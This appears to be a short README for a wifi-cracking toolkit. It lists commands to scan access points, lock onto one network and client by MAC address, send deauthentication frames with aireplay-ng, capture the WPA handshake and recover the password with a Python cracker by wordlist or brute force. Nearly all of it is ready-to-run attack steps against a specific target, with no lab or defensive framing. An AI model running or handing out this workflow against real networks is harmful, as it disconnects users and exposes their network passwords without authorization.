## Pre-requisits
install airodump-ng
have a netword card with monitor mode support

## 0. Enable monitor mode
./enable-monitor.sh

## 1. Scan available access points
sudo airodump-ng -w scan-aps wlp1s0mon
## 2. Extract all APs with their MAC address and channels
python3 extract-aps.py scan-aps-01.cap
## 3. Scan that AP on its channel to get the clients connected to it
sudo airodump-ng --bssid e8:48:b8:f0:0f:9c -c 2 -w do-deauth wlp1s0mon
## 4. Send the deauth frame to that client
sudo aireplay-ng --deauth 10 -a e8:48:b8:f0:0f:9c -c 52:62:E7:6C:26:C2 wlp1s0mon
## 5. Extract the full handshake
## 6. Extract values (ANonce, SNonce, MICs)
<!-- python3 extract-handshake.py do-deauth-05.cap --ssid "4010" --ap e8:48:b8:f0:0f:9c --client 52:62:E7:6C:26:C2 --out handshake.json -->

## 7.1 Dictionary attack using bruteforce
python3 wpa_cracker.py do-deauth-02.cap --wordlist passlist.txt 

## 7.2 Bruteforce
python3 wpa_cracker.py do-deauth-02.cap --bruteforce
+ optionally specify minimum length and maximum length of bruteforced password

